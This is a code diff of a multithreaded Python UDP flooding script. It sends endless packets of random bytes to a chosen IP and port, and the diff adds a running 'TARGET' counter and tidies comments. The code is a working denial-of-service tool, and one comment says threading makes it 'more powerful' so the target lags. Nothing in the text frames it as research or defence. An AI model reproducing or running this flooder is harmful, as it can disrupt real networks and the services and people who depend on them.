@@ -4,12 +4,13 @@ import random
 import sys
 import ctypes
 import os
-
 def start(ip, port, size, index):
+    xxv = 0
     data = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)         
     while True:
         data.sendto(random._urandom(size), (ip, port)) # Welp it just sends sockets ig
-        print(f"|| You've sent {size} bytes to {ip}")
+        xxv = xxv+1
+        print(f"TOTAL CONNECTIONS => {xxv} | BYTES => {size} | TARGET => {ip}:{port}")
         
         
         
@@ -34,20 +35,20 @@ def main():
             sys.exit(1)
 
         if packet > 65500 or packet < 1:
-            print("\n<<ERROR>> Size should be between 1 and 65500") # yeah no
+            print("\n<<ERROR>> Size should be between 1 and 65500") # similar to port
             sys.exit(1)
 
     except KeyboardInterrupt:
-        print("\nSee you soon :)") # if someone does ctrl + c / ctrl + z it will print this message
+        print("\nSee you soon :)") # if anyone will click ctrl + c or ctrl + z it will print this message
         sys.exit()
     
     except Exception as e:
         print(f"\n<<ERROR>> {e}") # well this is kinda useless but if error came out this will print it
         sys.exit()
 
-    for i in range(threads): # oops missed typo
+    for i in range(threads):
         try:
-            t = threading.Thread(target=start, args=(target, port, packet, i)) # i used threading so it can become more powerful and lag easliy
+            t = threading.Thread(target=start, args=(target, port, packet, i)) # i used threading so it can become more powerful and lag easily
             t.start()
         except Exception as e:
             print(f"\n<<ERROR>> An error ocurred initializing thread {i}: {e}")  # self explanatory      
